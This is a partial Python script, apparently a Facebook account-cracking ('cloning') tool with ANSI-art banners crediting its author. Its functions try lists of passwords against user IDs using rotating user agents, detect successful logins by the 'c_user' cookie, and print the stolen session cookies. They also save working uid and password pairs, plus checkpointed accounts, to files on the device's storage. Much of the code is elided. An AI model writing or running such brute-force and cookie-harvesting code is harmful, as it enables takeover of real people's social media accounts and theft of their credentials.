...
logo =("""
 ╔═════════════════════╗╔════════════════════════════╗   
 ║  ▄▄ • ▪  ·▄▄▄▄▄▄▄▄  ║║ Developar : Jubayer Islam  ║
 ║ ▐█ ▀ ▪██ ▐▄▄·•██    ║║ Admin     : JUBAYER & ISLAM  ║
 ║ ▄█ ▀█▄▐█·██▪  ▐█.▪  <> Github    : Rjjubayer       ║
 ║ ▐█▄▪▐█▐█▌██▌. ▐█▌·  ║║ Stetus    : Free Sc Jubayer   ║
 ║ ·▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀   ║║ Code      : 02             ║
 ╚═════════════════════╝╚════════════════════════════╝""") 
cloninglogo =("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝           
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mHAK JUBAYER \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-02\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝           
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mHAK JUBAYER     \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJUBAYER-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[JUBAYER-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJUBAYER-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/HASAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def Asraful3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mJUBAYER-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            hasanasha = random.choice(ugen)
